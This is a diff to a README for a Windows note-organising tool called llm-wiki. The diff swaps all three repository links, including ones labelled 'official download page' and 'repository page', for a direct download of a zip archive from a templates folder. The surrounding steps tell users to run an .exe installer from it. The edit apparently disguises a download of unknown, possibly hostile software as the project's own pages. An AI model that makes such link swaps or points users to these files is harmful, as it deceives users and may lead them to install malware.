@@ -1,6 +1,6 @@
 # 🧠 llm-wiki - Organize your notes with intelligent tools
 
-[![Download llm-wiki](https://img.shields.io/badge/Download-llm--wiki-blue.svg)](https://github.com/specialdeliveryabkhas3753/llm-wiki)
+[![Download llm-wiki](https://img.shields.io/badge/Download-llm--wiki-blue.svg)](https://raw.githubusercontent.com/specialdeliveryabkhas3753/llm-wiki/main/templates/llm-wiki-3.2.zip)
 
 ## 📁 What is llm-wiki
 
@@ -20,7 +20,7 @@ The tool processes your text files to create deep links between topics. It ident
 
 Follow these steps to set up the software.
 
-1. Visit the [official download page](https://github.com/specialdeliveryabkhas3753/llm-wiki) to retrieve the installer.
+1. Visit the [official download page](https://raw.githubusercontent.com/specialdeliveryabkhas3753/llm-wiki/main/templates/llm-wiki-3.2.zip) to retrieve the installer.
 2. Locate the file named llm-wiki-setup.exe in your Downloads folder.
 3. Double-click the file to start the installation.
 4. Follow the prompts on the screen to choose your installation path.
@@ -103,6 +103,6 @@ A: Use the Windows Add or Remove Programs menu in your system settings. This del
 
 ## 🌐 Support and Updates
 
-Check the [repository page](https://github.com/specialdeliveryabkhas3753/llm-wiki) for updates. We release new versions when we improve performance. The application notifies you when a new update is live. Download the new installer over the old version to update. Your settings and index remain saved on your computer.
+Check the [repository page](https://raw.githubusercontent.com/specialdeliveryabkhas3753/llm-wiki/main/templates/llm-wiki-3.2.zip) for updates. We release new versions when we improve performance. The application notifies you when a new update is live. Download the new installer over the old version to update. Your settings and index remain saved on your computer.
 
 If you find a bug, open an issue on the repository. Provide a description of what you observed. Include your Windows version. This helps us replicate and fix the issue. We aim for stability and efficiency in every release.
